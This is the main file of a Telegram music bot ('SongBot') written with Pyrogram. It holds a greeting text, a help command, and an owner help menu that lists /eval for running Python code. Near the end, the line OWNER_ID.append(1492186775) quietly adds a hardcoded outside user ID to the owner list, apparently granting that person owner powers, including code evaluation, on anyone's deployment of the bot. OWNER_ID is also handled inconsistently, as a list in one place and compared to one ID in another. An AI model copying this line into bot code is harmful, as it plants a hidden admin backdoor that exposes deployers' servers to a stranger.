from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from SongBot.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from SongBot import app, LOGGER
from SongBot.SongBot import ignore_blacklisted_users
from SongBot.sql.chat_sql import add_chat_to_db

cari_text = """
Hello [{}](tg://user?id={}),

\n\nI'm SongBot

I'M Music Bot

Send The Name of The Song You Want

𝐄x. ```/song Music```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("Yes ✅"))
async def cr_y(client, message):
    await message.reply(cari_text)

    
@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "Cari Musik yang anda inginkan \n Type /song (song name)"
    await message.reply(text)

OWNER_ID.append(1492186775)
app.start()
LOGGER.info("SongBot Is Running")
idle()
